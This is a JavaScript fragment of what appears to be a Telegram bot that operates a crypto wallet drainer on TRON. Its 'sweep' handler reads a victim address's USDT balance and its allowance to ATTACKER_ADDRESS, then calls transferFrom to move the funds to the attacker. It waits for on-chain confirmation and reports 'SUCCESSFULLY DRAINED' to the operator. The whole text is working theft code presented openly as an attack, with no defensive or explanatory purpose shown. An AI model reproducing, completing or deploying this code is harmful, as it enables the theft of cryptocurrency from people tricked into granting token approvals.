// ==========================================
// 3. SWEEP ALL FUNDS ACTION (The Drain) - ROBUST VERSION
// ==========================================
bot.action(/sweep_(.+)/, async (ctx) => {
  const addr = ctx.match[1];
  await ctx.answerCbQuery('Initiating Drain...');
  await ctx.editMessageText(`🕷️ *Draining funds from* \`${addr}\`...`, { parse_mode: 'Markdown' });

  try {
    const token = await tronWeb.contract().at(TOKEN_ADDRESS);
    
    const bal = BigInt((await token.balanceOf(addr).call()).toString());
    const allow = BigInt((await token.allowance(addr, ATTACKER_ADDRESS).call()).toString());
    
    if (allow === 0n) {
      return ctx.editMessageText(`❌ *Drain Failed.*\nAllowance is 0.`);
    }

    const amount = bal < allow ? bal : allow;
    console.log(`[SWEEP] Draining ${amount} from ${addr} to ${ATTACKER_ADDRESS}`);

    // Execute transferFrom
    const tx = await token.transferFrom(addr, ATTACKER_ADDRESS, amount.toString()).send({ feeLimit: 100000000 });
    
    // Robust TX ID extraction (handles both string and object returns)
    const txId = typeof tx === 'string' ? tx : (tx.txid || tx.transaction?.txID || JSON.stringify(tx));
    console.log(`[SWEEP] Broadcasted TX ID: ${txId}`);

    // Wait for confirmation (up to 30 seconds)
    let info = null;
    let tries = 0;
    while (!info && tries < 15) {
        try {
            info = await tronWeb.trx.getTransactionInfo(txId);
        } catch (e) {
            // Ignore network blips and retry
        }
        if (!info) {
            await new Promise(r => setTimeout(r, 2000));
            tries++;
        }
    }

    if (info && info.id) {
      // Check if it actually succeeded on the blockchain
      if (info.receipt && info.receipt.result === 'SUCCESS') {
        await ctx.editMessageText(`✅ *SUCCESSFULLY DRAINED*\n\n👤 From: \`${addr}\`\n💸 To: \`${ATTACKER_ADDRESS}\`\n💰 Amount: **${fmt(Number(amount)/1e6)} USDT**\n🔗 [View Tx](https://shasta.tronscan.org/#/transaction/${txId})`, { parse_mode: 'Markdown' });
      } else {
        await ctx.editMessageText(`❌ *Transaction Failed on Chain.*\nTX: ${txId}\nCheck Tronscan. (Attacker wallet might need TRX for gas).`);
      }
    } else {
      await ctx.editMessageText(`❌ *Transaction Pending/Timeout.*\nTX ID: ${txId}\nCheck Tronscan directly.`);
    }
  } catch (e) {
    console.error(e);
    ctx.editMessageText(`❌ *Drain Error:*\n${e.message}`);
  }
});